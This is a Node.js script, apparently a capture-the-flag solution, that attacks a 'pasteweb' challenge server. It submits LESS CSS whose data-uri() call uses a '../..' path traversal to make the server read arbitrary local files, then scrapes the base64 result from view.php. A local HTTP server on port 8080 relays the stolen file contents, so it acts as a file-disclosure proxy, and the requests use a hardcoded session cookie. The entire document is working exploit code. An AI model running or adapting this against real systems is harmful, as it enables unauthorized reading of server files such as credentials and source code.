
const http = require('http');

async function post(url) {
    const fd = new FormData()
    fd.append('less', `
    body {
        color: data-uri('../..${url}');
    }`)
    await fetch("https://pasteweb.ctf.zoolab.org/editcss.php", {
        headers: {
            'Cookie': "PHPSESSID=4o7bjgi90pues0qtr7cq508rgb"
        },
        body: fd,
        method: 'post'
    })
}

async function fetchContent() {
    return await fetch("https://pasteweb.ctf.zoolab.org/view.php", {
        headers: {
            'Cookie': "PHPSESSID=4o7bjgi90pues0qtr7cq508rgb"
        }
    }).then(r => r.text()).then(res => {
        const matchResult = res.match(/url\("data:.+;base64,(.*)"\)/)
        if (matchResult == null) {
            console.log(404, res.split('\n')[7])
            return null
        } else {
            console.log(200, 'from fetchContent')
            return Buffer.from(matchResult[1], 'base64')
        }
    })
}


const server = http.createServer();
server.on('request', async(req, res) => {
    console.log('< ', req.url)
    await post(req.url)
    const content = await fetchContent()
    if (content === null) {
        console.log(404, req.url)
        res.writeHead(404);
        res.end();
    } else {
        res.writeHead(200);
        res.end(content);
    }
})
server.listen(8080);